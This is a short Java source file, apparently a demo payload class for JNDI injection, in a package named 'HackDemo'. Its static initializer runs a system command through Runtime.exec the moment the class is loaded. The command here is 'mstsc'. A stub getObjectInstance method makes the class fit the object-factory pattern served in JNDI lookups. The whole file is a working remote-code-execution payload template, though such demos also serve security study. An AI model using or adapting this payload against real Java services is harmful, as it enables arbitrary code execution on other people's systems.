package JNDI.HackDemo;

import javax.naming.Context;
import javax.naming.Name;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.HashMap;

public class HackObject {
    public static void execCMD(String cmd) throws IOException {
        System.out.println(Runtime.getRuntime());
        StringBuilder ss=new StringBuilder();
        BufferedInputStream bufferedInputStream=new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
        BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(bufferedInputStream));
        String lineStr;
        while((lineStr=bufferedReader.readLine())!=null){
            ss.append(lineStr+"\n");
        }
        bufferedReader.close();
    }
    public Object getObjectInstance(Object obj, Name name, Context context, HashMap<?, ?> environment) throws Exception{
        return null;
    }
    static {
        try{
            execCMD("mstsc");
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
